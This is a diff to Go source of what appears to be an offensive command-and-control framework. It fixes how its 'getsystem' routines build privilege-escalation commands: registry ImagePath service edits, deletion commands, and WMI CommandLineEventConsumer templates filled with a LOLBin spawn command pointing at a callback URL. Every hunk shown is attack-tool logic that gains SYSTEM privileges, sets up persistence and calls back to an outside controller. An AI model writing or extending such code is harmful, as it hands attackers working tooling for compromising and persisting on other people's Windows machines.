@@ -2732,7 +2732,7 @@ func (is *InteractiveServer) executeGetSystem(sessionID string) error {
 					(strings.Contains(cmdTemplate, `%%WINDIR%%`) || strings.Contains(cmdTemplate, `System32`) || 
 					 strings.Contains(cmdTemplate, `Program Files`) || strings.Contains(cmdTemplate, `%%TEMP%%`))
 				
-				isDelCommand := strings.Contains(cmdTemplate, `del "%s"`) || strings.Contains(cmdTemplate, `del "%%`)
+				isDelCommand := strings.Contains(cmdTemplate, `del "%s"`) || strings.Contains(cmdTemplate, `del "%W`)
 				
 				isRegImagePath := strings.Contains(cmdTemplate, `reg add`) && strings.Contains(cmdTemplate, `/v ImagePath`) && strings.Contains(cmdTemplate, `/d "%s"`)
 				
@@ -2819,9 +2819,17 @@ func (is *InteractiveServer) executeGetSystem(sessionID string) error {
 					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
 				} else if isWmic {
 					// For wmic, wrap in cmd.exe /c
+					// Some WMI commands have multiple %s placeholders (e.g., CommandLineEventConsumer)
 					spawnCmdForExec := lolbinEsc.GenerateSpawnCommandForExec(callbackURL, "system")
 					spawnCmdForExecEscaped := strings.ReplaceAll(spawnCmdForExec, `%`, `%%`)
-					cmd = fmt.Sprintf(cmdTemplate, spawnCmdForExecEscaped)
+					// Count %s placeholders
+					placeholderCount := strings.Count(cmdTemplate, `%s`)
+					if placeholderCount == 2 {
+						// Two placeholders - use same command for both
+						cmd = strings.Replace(cmdTemplate, `%s`, spawnCmdForExecEscaped, 2)
+					} else {
+						cmd = fmt.Sprintf(cmdTemplate, spawnCmdForExecEscaped)
+					}
 				} else {
 					// For other commands, check if template has %s placeholder
 					if strings.Contains(cmdTemplate, `%s`) {
@@ -3248,7 +3256,7 @@ func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
 					(strings.Contains(cmdTemplate, `%%WINDIR%%`) || strings.Contains(cmdTemplate, `System32`) || 
 					 strings.Contains(cmdTemplate, `Program Files`) || strings.Contains(cmdTemplate, `%%TEMP%%`))
 				
-				isDelCommand := strings.Contains(cmdTemplate, `del "%s"`) || strings.Contains(cmdTemplate, `del "%%`)
+				isDelCommand := strings.Contains(cmdTemplate, `del "%s"`) || strings.Contains(cmdTemplate, `del "%W`)
 				
 				isRegImagePath := strings.Contains(cmdTemplate, `reg add`) && strings.Contains(cmdTemplate, `/v ImagePath`) && strings.Contains(cmdTemplate, `/d "%s"`)
 				
@@ -3332,9 +3340,17 @@ func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
 					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
 				} else if isWmic {
 					// For wmic, wrap in cmd.exe /c
+					// Some WMI commands have multiple %s placeholders (e.g., CommandLineEventConsumer)
 					spawnCmdForExec := lolbinEsc.GenerateSpawnCommandForExec(callbackURL, "system")
 					spawnCmdForExecEscaped := strings.ReplaceAll(spawnCmdForExec, `%`, `%%`)
-					cmd = fmt.Sprintf(cmdTemplate, spawnCmdForExecEscaped)
+					// Count %s placeholders
+					placeholderCount := strings.Count(cmdTemplate, `%s`)
+					if placeholderCount == 2 {
+						// Two placeholders - use same command for both
+						cmd = strings.Replace(cmdTemplate, `%s`, spawnCmdForExecEscaped, 2)
+					} else {
+						cmd = fmt.Sprintf(cmdTemplate, spawnCmdForExecEscaped)
+					}
 				} else {
 					// For other commands, check if template has %s placeholder
 					if strings.Contains(cmdTemplate, `%s`) {
